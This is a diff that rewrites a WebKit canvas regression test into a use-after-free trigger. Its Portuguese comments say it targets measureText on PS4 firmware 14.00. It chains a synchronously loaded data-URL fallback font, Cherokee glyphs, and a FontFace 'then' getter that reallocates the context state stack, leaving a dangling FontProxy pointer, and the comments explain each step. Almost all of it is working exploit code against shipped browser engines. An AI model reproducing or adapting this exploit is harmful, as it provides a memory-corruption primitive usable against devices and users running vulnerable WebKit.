@@ -1,36 +1,88 @@
-
-<!-- Identical to offscreen-canvas2d-measuretext-uaf.html, but exercising CanvasRenderingContext2D path -->
 <!DOCTYPE html>
-<p>This test passes if it does not crash.</p>
 <script>
-  
+// UAF FontProxy — hibrido fe938b0 + 42b1e2a
+//
+// Problema da adaptacao anterior:
+//   metricsOfPrimaryFont() dispara thenable-check ASSINCRONAMENTE no PS4
+//   → getter e chamado depois que measureText() retornou
+//   → fontProxy ja nao esta mais em uso → sem UAF
+//
+// Solucao: usar o trigger SINCRONO ja confirmado no PS4 (42b1e2a)
+//   MyTestFam como FALLBACK (nao primary) + caracter Cherokee (U+13A0)
+//   → glyph walk em width() nao encontra Cherokee em Times
+//   → cai para MyTestFam → opportunisticallyStartFontDataURLLoading
+//   → carregamento sincrono (confirmado no PS4 FW 14.00)
+//   → thenable-check dispara DENTRO de width(), DENTRO de measureTextInternal()
+//   → fontProxy (raw pointer obtido antes de width()) ainda esta sendo usado
+//
+// Acao do getter: context.save() × 32  (fe938b0)
+//   → reallocation do Vector m_stateStack
+//   → State antigo (com FontProxy) liberado
+//   → fontProxy DANGLING
+//   → uso posterior em measureTextInternal() → UAF
 
-  let face = new FontFace('MyTestFam', 'local(Helvetica)');
-  face.loaded;
-  document.fonts.add(face);
+fetch('resources/Ahem.woff')
+    .then(function(r) { return r.arrayBuffer(); })
+    .then(function(b) {
+        return new Promise(function(res, rej) {
+            var fr = new FileReader();
+            fr.onload  = function(e) { res(e.target.result); };
+            fr.onerror = rej;
+            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
+        });
+    })
+    .then(function(dataUrl) {
 
-  let context = document.createElement('canvas').getContext('2d');
+        var face = new FontFace('MyTestFam', 'url("' + dataUrl + '")');
+        document.fonts.add(face);
+        void face.loaded;
 
-  context.save();
-  context.lineWidth = 0.5;
+        var context = document.createElement('canvas').getContext('2d');
 
-  context.font = '10px MyTestFam';
-
-  let reentered = false;
-  Object.defineProperty(FontFace.prototype, 'then', {
-    configurable: true,
-    get() {
-      if (reentered)
-        return undefined;
-      reentered = true;
-      for (let i = 0; i < 18; i++) {
+        // Save previo: forca m_stateStack do inline storage para o heap.
+        // Necessario para que os saves dentro do getter causem reallocation
+        // do buffer de heap (e nao apenas a transicao inline -> heap).
         context.save();
-        context.lineWidth = 1 + i;
-      }
-      reentered = false;
-      return undefined;
-    }
-  });
+        context.lineWidth = 0.5;
 
-  context.measureText('a');
+        // MyTestFam como FALLBACK — Times nao tem glifos Cherokee (U+13A0)
+        // → o glyph walk de width() cai para MyTestFam
+        // → opportunisticallyStartFontDataURLLoading(MyTestFam) dispara
+        context.font = '10px Times, MyTestFam';
+
+        var reentered = false;
+        Object.defineProperty(face, 'then', {
+            configurable: true,
+            get: function() {
+                if (reentered) return undefined;
+                reentered = true;
+                // Reallocation do Vector m_stateStack
+                // O State que contem o FontProxy apontado por fontProxy*
+                // estava no buffer antigo → buffer antigo liberado
+                // → fontProxy DANGLING apos retorno do getter
+                for (var i = 0; i < 32; i++) {
+                    context.save();
+                    context.lineWidth = 1 + i;
+                }
+                reentered = false;
+                return undefined;
+            }
+        });
+
+        // Cherokee (U+13A0): ausente em Times → cai para MyTestFam
+        // Sequencia em measureTextInternal() (versao vulneravel):
+        //   fontProxy = this->fontProxy()            ← raw ptr, State no heap
+        //   fontProxy->metricsOfPrimaryFont()        ← Times: ja carregado, ok
+        //   fontProxy->width('\u13A0\u13A2\u13A4')
+        //     → glyph walk → U+13A0 → MyTestFam
+        //     → opportunisticallyStartFontDataURLLoading(face)
+        //     → Ahem.woff data: URL → carrega SINCRONAMENTE
+        //     → FontFace.loaded fulfillado → thenable-check → face.then
+        //     → getter dispara → context.save() × 32
+        //     → Vector realloc → State antigo FREED → fontProxy DANGLING
+        //   [width() retorna]
+        //   fontProxy->qualquerCoisa()               ← UAF
+        context.measureText('\u13A0\u13A2\u13A4');
+
+    });
 </script>
